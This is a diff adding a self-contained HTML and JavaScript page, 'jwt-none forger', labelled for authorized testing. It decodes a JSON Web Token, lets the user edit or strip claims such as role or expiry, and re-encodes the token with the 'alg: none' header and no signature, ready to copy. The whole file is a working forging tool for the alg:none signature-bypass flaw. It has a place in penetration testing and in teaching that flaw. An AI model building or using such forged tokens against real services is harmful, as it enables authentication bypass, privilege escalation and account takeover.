@@ -1,0 +1,418 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>jwt-none forger</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root {
+      --bg: #0f1117;
+      --panel: #161a22;
+      --panel-2: #1d222d;
+      --border: #2a3140;
+      --text: #e6e6e6;
+      --muted: #8b94a7;
+      --accent: #7aa2f7;
+      --accent-2: #9ece6a;
+      --danger: #f7768e;
+      --warn: #e0af68;
+      --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.45;
+    }
+    header {
+      padding: 20px 28px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: baseline;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 18px;
+      letter-spacing: 0.5px;
+    }
+    header .tag {
+      font-size: 12px;
+      color: var(--warn);
+      border: 1px solid var(--warn);
+      padding: 2px 8px;
+      border-radius: 999px;
+    }
+    main {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+      padding: 16px 28px 32px;
+    }
+    .panel {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 14px 16px;
+      display: flex;
+      flex-direction: column;
+      min-height: 220px;
+    }
+    .panel.full { grid-column: 1 / -1; }
+    .panel h2 {
+      margin: 0 0 8px;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      color: var(--muted);
+    }
+    textarea, input[type=text] {
+      width: 100%;
+      background: var(--panel-2);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-family: var(--mono);
+      font-size: 13px;
+      resize: vertical;
+    }
+    textarea { min-height: 130px; }
+    .row {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      flex-wrap: wrap;
+      margin-top: 10px;
+    }
+    button {
+      background: var(--accent);
+      color: #0b0f17;
+      border: 0;
+      border-radius: 8px;
+      padding: 8px 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 13px;
+    }
+    button.secondary {
+      background: transparent;
+      color: var(--accent);
+      border: 1px solid var(--accent);
+    }
+    button.go { background: var(--accent-2); }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    label.check {
+      font-size: 12px;
+      color: var(--muted);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    pre.out {
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-family: var(--mono);
+      font-size: 13px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin: 0;
+      min-height: 60px;
+    }
+    .err {
+      color: var(--danger);
+      font-family: var(--mono);
+      font-size: 12px;
+      margin-top: 8px;
+      white-space: pre-wrap;
+    }
+    .muted { color: var(--muted); font-size: 12px; }
+    .removes-list {
+      display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px;
+    }
+    .chip {
+      background: var(--panel-2);
+      border: 1px solid var(--border);
+      border-radius: 999px;
+      padding: 4px 10px;
+      font-family: var(--mono);
+      font-size: 12px;
+      display: inline-flex;
+      gap: 6px;
+      align-items: center;
+    }
+    .chip button {
+      background: transparent;
+      color: var(--danger);
+      padding: 0;
+      font-size: 14px;
+      line-height: 1;
+    }
+    footer {
+      padding: 0 28px 24px;
+      color: var(--muted);
+      font-size: 12px;
+    }
+    @media (max-width: 880px) {
+      main { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>jwt-none forger</h1>
+    <span class="tag">authorized testing only</span>
+  </header>
+
+  <main>
+    <section class="panel full">
+      <h2>Input JWT</h2>
+      <textarea id="input-token" placeholder="paste a JWT (header.payload.signature) — decoded live as you type"></textarea>
+      <div class="row">
+        <span class="muted" id="decode-status">awaiting input</span>
+        <button class="secondary" id="btn-reset-payload" title="Re-populate the editable payload from the input token">Reset payload</button>
+      </div>
+      <div class="err" id="decode-err"></div>
+    </section>
+
+    <section class="panel">
+      <h2>Decoded header (read-only)</h2>
+      <pre class="out" id="header-view">—</pre>
+    </section>
+
+    <section class="panel">
+      <h2>Editable payload (JSON)</h2>
+      <textarea id="payload-edit" placeholder='{ "sub": "alice", "role": "user" }'></textarea>
+      <div class="row">
+        <input type="text" id="remove-input" placeholder="claim to remove (e.g. exp)" style="flex:1; min-width: 180px;" />
+        <button class="secondary" id="btn-add-remove">Add remove</button>
+      </div>
+      <div class="removes-list" id="removes-list"></div>
+    </section>
+
+    <section class="panel full">
+      <h2>Options</h2>
+      <div class="row">
+        <label class="check"><input type="checkbox" id="opt-keep-header" /> keep header extras (kid, etc.)</label>
+        <label class="check"><input type="checkbox" id="opt-trailing-dot" checked /> trailing dot ("h.p.")</label>
+        <span class="muted" id="forge-status">awaiting input</span>
+      </div>
+      <div class="err" id="forge-err"></div>
+    </section>
+
+    <section class="panel full">
+      <h2>Forged token</h2>
+      <pre class="out" id="output-token">—</pre>
+      <div class="row">
+        <button class="secondary" id="btn-copy">Copy token</button>
+        <span class="muted" id="copy-status"></span>
+      </div>
+      <h2 style="margin-top:14px;">Forged header / payload</h2>
+      <pre class="out" id="output-detail">—</pre>
+    </section>
+  </main>
+
+  <footer>
+    Local helper for the classic <code>alg: none</code> JWT acceptance flaw. Never deploy this.
+  </footer>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+    const state = { removes: [], lastDecodedToken: null };
+
+    function b64urlEncodeFromString(str) {
+      const bytes = new TextEncoder().encode(str);
+      let bin = "";
+      for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+      return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+    }
+
+    function b64urlDecodeToString(seg) {
+      let s = seg.replace(/-/g, "+").replace(/_/g, "/");
+      while (s.length % 4) s += "=";
+      const bin = atob(s);
+      const bytes = new Uint8Array(bin.length);
+      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+      return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
+    }
+
+    function decodeClientSide(token) {
+      const parts = token.split(".");
+      if (parts.length < 2 || parts.length > 3) {
+        throw new Error(`expected 2 or 3 dot-separated segments, got ${parts.length}`);
+      }
+      const [h, p, s = ""] = parts;
+      let header, payload;
+      try { header = JSON.parse(b64urlDecodeToString(h)); }
+      catch (e) { throw new Error("header is not valid base64url JSON"); }
+      try { payload = JSON.parse(b64urlDecodeToString(p)); }
+      catch (e) { throw new Error("payload is not valid base64url JSON"); }
+      if (typeof header !== "object" || header === null || Array.isArray(header)) {
+        throw new Error("header must decode to a JSON object");
+      }
+      if (typeof payload !== "object" || payload === null || Array.isArray(payload)) {
+        throw new Error("payload must decode to a JSON object");
+      }
+      return { header, payload, signature: s };
+    }
+
+    function debounce(fn, ms) {
+      let t;
+      return (...args) => {
+        clearTimeout(t);
+        t = setTimeout(() => fn(...args), ms);
+      };
+    }
+
+    function forgeClientSide({ header, payload, removes, keepHeaderExtras, trailingDot }) {
+      const newPayload = JSON.parse(JSON.stringify(payload));
+      for (const k of removes || []) delete newPayload[k];
+      let newHeader;
+      if (keepHeaderExtras && header && typeof header === "object") {
+        newHeader = { alg: "none" };
+        for (const [k, v] of Object.entries(header)) {
+          if (k !== "alg") newHeader[k] = v;
+        }
+        if (newHeader.typ === undefined) newHeader.typ = "JWT";
+      } else {
+        newHeader = { alg: "none", typ: "JWT" };
+      }
+      const h = b64urlEncodeFromString(JSON.stringify(newHeader));
+      const p = b64urlEncodeFromString(JSON.stringify(newPayload));
+      const token = trailingDot ? `${h}.${p}.` : `${h}.${p}`;
+      return { header: newHeader, payload: newPayload, token };
+    }
+
+    function applyDecoded(token, opts = { force: false }) {
+      const trimmed = token.trim();
+      const statusEl = $("decode-status");
+      const errEl = $("decode-err");
+      errEl.textContent = "";
+      if (!trimmed) {
+        $("header-view").textContent = "—";
+        state.lastHeader = null;
+        if (opts.force) $("payload-edit").value = "";
+        statusEl.textContent = "awaiting input";
+        state.lastDecodedToken = null;
+        runForge();
+        return;
+      }
+      let decoded;
+      try { decoded = decodeClientSide(trimmed); }
+      catch (e) {
+        statusEl.textContent = "invalid token";
+        errEl.textContent = e.message;
+        state.lastHeader = null;
+        runForge();
+        return;
+      }
+      $("header-view").textContent = JSON.stringify(decoded.header, null, 2);
+      state.lastHeader = decoded.header;
+      if (opts.force || state.lastDecodedToken !== trimmed) {
+        $("payload-edit").value = JSON.stringify(decoded.payload, null, 2);
+      }
+      state.lastDecodedToken = trimmed;
+      statusEl.textContent = "decoded";
+      runForge();
+    }
+
+    function runForge() {
+      const statusEl = $("forge-status");
+      const errEl = $("forge-err");
+      errEl.textContent = "";
+      const header = state.lastHeader;
+      const raw = $("payload-edit").value.trim();
+      if (!header || !raw) {
+        $("output-token").textContent = "—";
+        $("output-detail").textContent = "—";
+        statusEl.textContent = "awaiting input";
+        return;
+      }
+      let payload;
+      try { payload = JSON.parse(raw); }
+      catch (e) {
+        statusEl.textContent = "payload JSON invalid";
+        errEl.textContent = e.message;
+        return;
+      }
+      if (typeof payload !== "object" || payload === null || Array.isArray(payload)) {
+        statusEl.textContent = "payload JSON invalid";
+        errEl.textContent = "payload must be a JSON object";
+        return;
+      }
+      const forged = forgeClientSide({
+        header,
+        payload,
+        removes: state.removes,
+        keepHeaderExtras: $("opt-keep-header").checked,
+        trailingDot: $("opt-trailing-dot").checked,
+      });
+      $("output-token").textContent = forged.token;
+      $("output-detail").textContent = JSON.stringify(
+        { header: forged.header, payload: forged.payload }, null, 2
+      );
+      statusEl.textContent = "forged";
+    }
+
+    function renderRemoves() {
+      const el = $("removes-list");
+      el.innerHTML = "";
+      state.removes.forEach((k, i) => {
+        const c = document.createElement("span");
+        c.className = "chip";
+        c.textContent = k;
+        const b = document.createElement("button");
+        b.textContent = "x";
+        b.title = "remove";
+        b.onclick = () => { state.removes.splice(i, 1); renderRemoves(); runForge(); };
+        c.appendChild(b);
+        el.appendChild(c);
+      });
+    }
+
+    const liveDecode = debounce(() => applyDecoded($("input-token").value), 120);
+    $("input-token").addEventListener("input", liveDecode);
+    $("input-token").addEventListener("paste", () => {
+      setTimeout(() => applyDecoded($("input-token").value, { force: true }), 0);
+    });
+
+    $("btn-reset-payload").onclick = () => {
+      applyDecoded($("input-token").value, { force: true });
+    };
+
+    $("btn-add-remove").onclick = () => {
+      const v = $("remove-input").value.trim();
+      if (!v) return;
+      if (!state.removes.includes(v)) state.removes.push(v);
+      $("remove-input").value = "";
+      renderRemoves();
+      runForge();
+    };
+    $("remove-input").addEventListener("keydown", (e) => {
+      if (e.key === "Enter") { e.preventDefault(); $("btn-add-remove").click(); }
+    });
+
+    const liveForge = debounce(runForge, 80);
+    $("payload-edit").addEventListener("input", liveForge);
+    $("opt-keep-header").addEventListener("change", runForge);
+    $("opt-trailing-dot").addEventListener("change", runForge);
+
+    $("btn-copy").onclick = async () => {
+      const t = $("output-token").textContent;
+      if (!t || t === "—") return;
+      try {
+        await navigator.clipboard.writeText(t);
+        $("copy-status").textContent = "copied";
+        setTimeout(() => ($("copy-status").textContent = ""), 1500);
+      } catch {
+        $("copy-status").textContent = "copy failed";
+      }
+    };
+  </script>
+</body>
+</html>
